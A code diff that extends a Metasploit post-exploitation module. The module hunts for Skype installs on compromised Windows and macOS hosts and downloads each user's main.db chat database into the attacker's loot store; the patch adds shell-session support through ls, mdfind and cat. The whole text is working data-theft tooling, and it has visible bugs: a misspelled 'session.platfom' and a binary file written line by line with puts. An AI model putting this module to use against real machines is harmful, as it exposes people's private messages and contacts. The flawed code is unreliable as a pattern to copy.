@@ -42,8 +42,13 @@ class Metasploit3 < Msf::Post
 				'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
 				'Version'       => '$Revision$',
 				'Platform'      => [ 'windows', 'osx' ],
-				'SessionTypes'  => [ 'meterpreter' ]
+				'SessionTypes'  => [ 'meterpreter', 'shell' ]
 			))
+		register_advanced_options(
+			[
+				# Set as an advanced option since it can only be useful in shell sessions.
+				OptInt.new('TIMEOUT', [true ,'Timeout in seconds when downloading main.db on a shell session.', 90]),
+			], self.class)
 	end
 
 	# Run Method for when run command is issued
@@ -58,30 +63,48 @@ class Metasploit3 < Msf::Post
 			print_error("Failed to load sqlite3, try 'gem install sqlite3'")
 			return
 		end
-
-		if sysinfo['OS']=~ /Mac OS X/
-			# Iterate thru each user profile on as OSX System for users not in the default install
-			users = get_nonsystem_accounts.collect {|p| if p['uid'].to_i > 500; p; end }.compact
-			users.each do |p|
-				if check_skype("#{p['dir']}/Library/Application Support/", p['name'])
-					db_in_loot = download_db(p)
-					process_db(db_in_loot,p['name'])
+		
+			if (session.platform =~ /java/) || (session.platform =~ /osx/)
+				# Make sure a Java Meterpreter on anything but OSX will exit
+				if session.platform =~ /java/ and sysinfo['OS'] !~ /Mac OS X/
+					print_error("This session type and platform are not supported.")
+					return
 				end
-			end
-		else
-			# Iterate thru each user profile in a Windows System using Meterpreter Post API
-			grab_user_profiles().each do |p|
-				if check_skype(p['AppData'],p['UserName'])
-					db_in_loot = download_db(p)
-					process_db(db_in_loot,p['UserName'])
+				# Iterate thru each user profile on as OSX System for users not in the default install
+				users = get_users.collect {|p| if p['uid'].to_i > 500; p; end }.compact
+				users.each do |p|
+					if check_skype("#{p['dir']}/Library/Application Support/", p['name'])
+						db_in_loot = download_db(p)
+						# Exit if file was not successfully downloaded
+						return if db_in_loot.nil?
+						process_db(db_in_loot,p['name'])
+					end
 				end
+			elsif (session.platfom =~ /win/ and session.type =~ /meter/)
+				# Iterate thru each user profile in a Windows System using Meterpreter Post API
+				grab_user_profiles().each do |p|
+					if check_skype(p['AppData'],p['UserName'])
+						db_in_loot = download_db(p)
+						process_db(db_in_loot,p['UserName'])
+					end
+				end
+			else
+				print_error("This session type and platform are not supported.")
 			end
-		end
+		
 	end
 
 	# Check if Skype is installed. Returns true or false.
 	def check_skype(path, user)
-		session.fs.dir.foreach(path) do |dir|
+		dirs = []
+		if session.type =~ /meterpreter/
+			session.fs.dir.foreach(path) do |d|
+				dirs << d
+			end
+		else
+			dirs = cmd_exec("ls -m \"#{path}\"").split(", ")
+		end
+		dirs.each do |dir|
 			if dir =~ /Skype/
 				print_good("Skype account found for #{user}")
 				return true
@@ -93,10 +116,14 @@ class Metasploit3 < Msf::Post
 
 	# Download file using Meterpreter functionality and returns path in loot for the file
 	def download_db(profile)
-		if sysinfo['OS'] =~ /Mac OS X/
-			file = session.fs.file.search("#{profile['dir']}///Library/Application Support/Skype/","main.db",true)
+		if session.type =~ /meterpreter/
+			if sysinfo['OS'] =~ /Mac OS X/
+				file = session.fs.file.search("#{profile['dir']}/Library/Application Support/Skype/","main.db",true)
+			else
+				file = session.fs.file.search("#{profile['AppData']}\\Skype","main.db",true)
+			end
 		else
-			file = session.fs.file.search("#{profile['AppData']}\\Skype","main.db",true)
+			file = cmd_exec("mdfind","-onlyin #{profile['dir']} -name main.db").split("\n").collect {|p| if p =~ /Skype\/\w*\/main.db$/; p; end }.compact
 		end
 		
 		file_loc = store_loot("skype.config",
@@ -107,12 +134,27 @@ class Metasploit3 < Msf::Post
 			)
 
 		file.each do |db|
-			maindb = "#{db['path']}#{session.fs.file.separator}#{db['name']}"
-			print_status("Downloading #{maindb}")
-			session.fs.file.download_file(file_loc,maindb)
+			if session.type =~ /meterpreter/
+				maindb = "#{db['path']}#{session.fs.file.separator}#{db['name']}"
+				print_status("Downloading #{maindb}")
+				session.fs.file.download_file(file_loc,maindb)
+			else
+				print_status("Downloading #{db}")
+				# Giving it 1:30 minutes to download since the file could be several MB
+				maindb = cmd_exec("cat", "\"#{db}\"", datastore['TIMEOUT'])
+				if maindb.nil?
+					print_error("Could not download the file. Set the TIMEOUT option to a higher number.")
+					return
+				end
+				# Saving the content as binary so it can be used
+				output = ::File.open(file_loc, "wb")
+				maindb.each_line do |d|
+					output.puts(d)
+				end
+				output.close
+			end
 			print_good("Configuration database saved to #{file_loc}")
 		end
-
 		return file_loc
 	end
 
